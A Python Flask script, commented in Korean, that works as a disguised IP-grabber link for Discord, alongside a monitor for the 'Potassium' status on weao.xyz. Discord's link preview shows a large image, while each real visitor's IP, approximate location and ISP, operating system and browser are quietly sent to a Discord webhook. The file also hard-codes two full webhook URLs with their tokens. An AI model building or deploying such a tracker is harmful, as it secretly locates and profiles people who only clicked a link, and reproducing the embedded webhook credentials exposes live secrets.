import os
import time
import threading
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

# 설정
DISCORD_WEBHOOK_URL_STATUS = "https://discord.com/api/webhooks/1547891715279687763/jGm9yeR8j_k5kOHFS-Knmt57n8bm8vTSTiiAVJAlmywH0HsSEeCjNL-2XRkOqHrU6flW" # 포타슘 상태 알림용
DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3rQMtk8DOXHI2OjmBCaCNbv54yJm9u27t0GLbfhJQ-2oL7SAZVGQ_NhXzQ1D2yzzB89n"     # 접속 정보 로깅용

TARGET_URL = "https://weao.xyz"
last_status = None

# 🔥 디스코드 거대 이미지 카드 미리보기 HTML (나무위키 이미지 + 큼직한 사진 형태 적용)
PREVIEW_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <!-- 디스코드에 이미지를 커다랗게 꽉 채워서 보여달라고 강제하는 태그 -->
    <meta name="twitter:card" content="summary_large_image">
    <meta property="og:image" content="https://i.namu.wiki/i/Va3Dy_3qFHvGQS4qwv0oCvFySbT1DXJkK0zfMosd2UK6Jun8Zucb796VLJzLL4A40e5P4dgbBPT4da2Bv_S50Q.webp">
    <meta property="og:title" content=" ">
    <meta property="og:description" content=" ">
</head>
<body style="background-color: #111; color: #fff; text-align: center; padding-top: 50px;">
    <h2>로딩 중입니다... 잠시만 기다려주세요.</h2>
</body>
</html>
"""

# 1. 포타슘 상태 감시 백그라운드 스레드
def monitor_potassium():
    global last_status
    while True:
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.get(TARGET_URL, headers=headers)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                potassium_element = None
                for tag in soup.find_all(string=lambda t: t and 'Potassium' in t):
                    potassium_element = tag.parent
                    break
                    
                if potassium_element:
                    element_html = str(potassium_element)
                    current_status = "Online (작동 중)" if ("green" in element_html or "🟢" in element_html or "working" in element_html.lower()) else "Offline (막힘/점검중)"
                    
                    if last_status is not None and last_status != current_status:
                        discord_payload = {
                            "content": f"🚨 **포타슘(Potassium) 상태 변경 감지!**\n상태: `{current_status}`"
                        }
                        requests.post(DISCORD_WEBHOOK_URL_STATUS, json=discord_payload)
                        print(f"[!] 포타슘 상태 변경 알림 전송: {current_status}")
                        
                    last_status = current_status
        except Exception as e:
            print(f"[!] 모니터링 에러: {e}")
            
        time.sleep(60)

# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + 거대 이미지 OG 태그 적용)
@app.route('/')
def catch_ip():
    user_agent = request.headers.get('User-Agent', 'N/A')
    
    # 디스코드 미리보기 봇이 긁어갈 때는 OG 태그가 담긴 HTML을 보여줌 (웹훅 안 쏨)
    if "Discordbot" in user_agent:
        print("[!] 디스코드 미리보기 봇이 이미지를 긁어감")
        return render_template_string(PREVIEW_HTML)

    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        user_ip = request.remote_addr
        
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    os_info = "기타 OS"
    browser_info = "기타 브라우저"
    
    if "Windows NT 10.0" in user_agent:
        os_info = "Windows 10 / 11"
    elif "Windows NT 6.1" in user_agent:
        os_info = "Windows 7"
    elif "Mac OS X" in user_agent:
        os_info = "macOS"
    elif "Android" in user_agent:
        os_info = "Android"
    elif "iPhone" in user_agent or "iPad" in user_agent:
        os_info = "iOS"
    elif "Linux" in user_agent:
        os_info = "Linux"
        
    if "Edg/" in user_agent:
        try:
            ver = user_agent.split("Edg/")[1].split(" ")[0]
            browser_info = f"Edge ({ver})"
        except:
            browser_info = "Edge"
    elif "Chrome/" in user_agent:
        try:
            ver = user_agent.split("Chrome/")[1].split(" ")[0]
            browser_info = f"Chrome ({ver})"
        except:
            browser_info = "Chrome"
    elif "Firefox/" in user_agent:
        try:
            ver = user_agent.split("Firefox/")[1].split(" ")[0]
            browser_info = f"Firefox ({ver})"
        except:
            browser_info = "Firefox"
    elif "Safari/" in user_agent and "Chrome/" not in user_agent:
        browser_info = "Safari"

    # UptimeRobot 같은 핑 봇은 차단하고 미리보기 HTML 리턴
    if os_info == "기타 OS" and browser_info == "기타 브라우저":
        print(f"[!] 핑 봇 접속 차단됨 (IP: {user_ip})")
        return render_template_string(PREVIEW_HTML)

    # IP 주소로 대략적인 지역 및 통신사 조회 (ip-api 이용)
    location_info = "조회 불가"
    try:
        if user_ip not in ["127.0.0.1", "localhost"]:
            geo_res = requests.get(f"http://ip-api.com/json/{user_ip}?fields=status,country,regionName,city,isp", timeout=3).json()
            if geo_res.get("status") == "success":
                country = geo_res.get("country", "")
                region = geo_res.get("regionName", "")
                city = geo_res.get("city", "")
                isp = geo_res.get("isp", "")
                location_info = f"{country} / {region} ({city}) - {isp}"
    except Exception as e:
        print(f"[!] 위치 조회 에러: {e}")

    print(f"[!] 실제 접속 감지 -> IP: {user_ip} | 지역: {location_info} | OS: {os_info} | Browser: {browser_info}")
        
    discord_payload = {
        "content": "서버 접속 알림",
        "embeds": [
            {
                "title": "정보",
                "color": 3447003, 
                "fields": [
                    {"name": "IP 주소", "value": f"`{user_ip}`", "inline": True},
                    {"name": "시간", "value": f"`{timestamp}`", "inline": True},
                    {"name": "지역/통신사", "value": f"`{location_info}`", "inline": False},
                    {"name": "운영체제", "value": f"`{os_info}`", "inline": True},
                    {"name": "브라우저", "value": f"`{browser_info}`", "inline": True}
                ]
            }
        ]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL_IP, json=discord_payload)
    except Exception as e:
        print(f"[!] 디스코드 웹훅 에러 발생 : {e}")
    
    return render_template_string(PREVIEW_HTML)

if __name__ == '__main__':
    # 백그라운드 포타슘 감시 스레드 실행
    t = threading.Thread(target=monitor_potassium)
    t.daemon = True
    t.start()
    
    # 렌더 포트 바인딩 및 플라스크 서버 실행
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
